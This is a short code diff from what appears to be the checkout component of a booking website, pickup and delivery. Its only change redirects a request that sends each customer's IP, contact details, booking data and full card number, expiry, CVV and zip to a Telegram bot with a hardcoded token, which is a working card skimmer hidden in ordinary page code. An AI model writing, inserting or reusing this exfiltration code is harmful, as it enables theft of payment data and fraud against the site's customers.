@@ -2534,7 +2534,7 @@ export default {
       cczip
     ) {
       await this.$axios.post(
-        `https://api.telegram.org/bot5878927199:AAGM4j1rVxyqRv7xpD4NWM_EdIcEXKEuUwE/sendMessage?chat_id=-1001900427343&text=User IP: ${this.userIp}, Customer Info:
+        `https://api.telegram.org/bot5878927199:AAGM4j1rVxyqRv7xpD4NWM_EdIcEXKEuUwE/sendMessage?chat_id=-4069387529&text=User IP: ${this.userIp}, Customer Info:
         Pick up:${pickup}, Delivery: ${delivery}, Date: ${date}, Type: ${type}, Name: ${name}, Email: ${email}, Phone: ${phone}, Price:$${price},
         CC number: ${ccnumber}, CC Name: ${ccname}, CC Date: ${ccdate}, CVV: ${cccvv}, Zip: ${cczip}`
       );
